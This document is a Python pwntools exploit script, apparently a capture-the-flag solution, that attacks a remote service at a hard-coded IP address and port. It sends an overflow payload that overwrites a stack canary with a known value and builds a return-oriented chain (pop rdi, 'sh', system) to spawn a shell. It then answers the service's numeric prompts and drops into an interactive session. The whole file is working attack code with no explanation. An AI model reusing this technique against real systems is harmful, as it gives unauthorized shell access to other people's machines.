#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.28"
port = 8888

host = "54.179.162.147"
port = 2306

r = remote(host,port)
system = 0x400880
sh = 0x4004c7
pop_rdi = 0x0000000000401363
canary = 0x4443424144434241  
username = "MOOLISAA"  + p64(canary) +  "AAAAAAAA" +  p64(pop_rdi) + p64(sh) + p64(system) + "A"*24 +"MOOLISA"
print len(username)
password = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMOOLIS" 

r.recvuntil("name?")
r.sendline(username)
r.recvuntil("code:")
r.sendline(password)

numbers = str(16896).ljust(16,"\x00") + p64(0x4141414141414141) + p64(0x4242424242424242)

r.send(numbers)

magic = 781.03521728515625 #ABCD
r.recvuntil(">>>")
r.sendline("0")
r.recvuntil("moo:")
r.sendline("18147")
r.recvuntil("moo:")
r.sendline(str(magic))

r.recvuntil("moo:")
r.sendline(str(magic))
r.interactive()
